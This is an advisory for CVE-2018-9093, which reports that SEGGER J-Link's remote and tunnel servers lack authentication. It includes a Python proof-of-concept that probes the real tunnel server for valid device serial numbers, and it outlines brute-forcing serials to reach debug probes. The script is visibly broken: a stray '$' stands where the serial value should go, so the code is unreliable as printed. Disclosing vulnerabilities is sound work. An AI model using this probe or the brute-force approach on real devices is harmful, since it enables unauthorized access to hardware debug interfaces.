### JLinkRemoteServer/Tunnel Server Lacks Authentication ###

# Product #
JLink v3.60i

# Vulnerability Type #
Improper Access Control

# CVE Reference #
CVE-2018-9093

# Security Issue #
Unauthenticated access in JLinkRemoteServer in SEGGER J-Link allows attackers to remotely execute J-Link commands

Neither the JLink Remote Server (JLinkRemoteServer.exe, JLinkRemoteServerCL.exe) nor the Segger Tunnel Server (jlink.segger.com) performs any authentication on incoming connections. When used in tunnel mode, the JLinkRemoteServer connects to the JLink tunnel server and then registers the device serial number of a JLink Debug Probe with the server. The tunnel server accepts connections from the JLink application (JLink.exe) and serves as a proxy between the JLink.exe application and the JLinkRemoteServer.exe (which provides access to the JLInk Debug Probe). The tunnel server does not provide any type of authentication allowing an attacker to connect to a device by only specifying the serial number. Since the serial number is a 9-digit decimal number, this could be easily brute forced by an attacker identify and connect to any available JLInk Remote Server that is running.

The script below allows a user to query the tunnel server as to whether a JLink device with a specified serial number is available via the tunnel server. If an attacker were to develop a similar script to brute force the serial numbers that are available, the attacker could then use the JLink.exe executable to connect to discovered devices and execute malicious actions.

# Exploit/POC #

CVE-2018-9093.py
=============
# Example Script that would Identify if a Segger JLINK Device is currently available
import socket
import struct

magic_number = 0x55667788

s = socket.socket()
serial_number = 0xdeadbeef

s.connect(("jlink.segger.com", 19020))
s.send(struct.pack("<I", magic_number))
s.send(struct.pack("<I", $))

buf = s.recv(4)
if len(buf) < 4 or struct.unpack("<i", buf)[0] < 0:
    print "Error"
else:
    print "Valid Serial Number"
=============

# Network Access #
Remote

# Severity #
High


